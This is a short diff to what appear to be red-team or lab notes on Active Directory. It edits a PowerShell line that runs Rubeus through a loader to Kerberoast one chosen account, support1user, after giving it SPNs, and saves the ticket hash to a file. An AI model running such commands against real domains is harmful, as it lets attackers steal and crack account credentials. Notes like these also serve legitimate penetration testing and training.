@@ -29,5 +29,5 @@ Set-ADUser -Identity support1user -ServicePrincipalNames
 
 Kerberoast
 ```powershell
-.\Loader.exe -path .\Rubeus.exe -args kerberoast /rc4opsec /outfile:hashes.txt
+.\Loader.exe -path .\Rubeus.exe -args kerberoast /user:support1user /simple /rc4opsec /outfile:support1user.hash
 ```
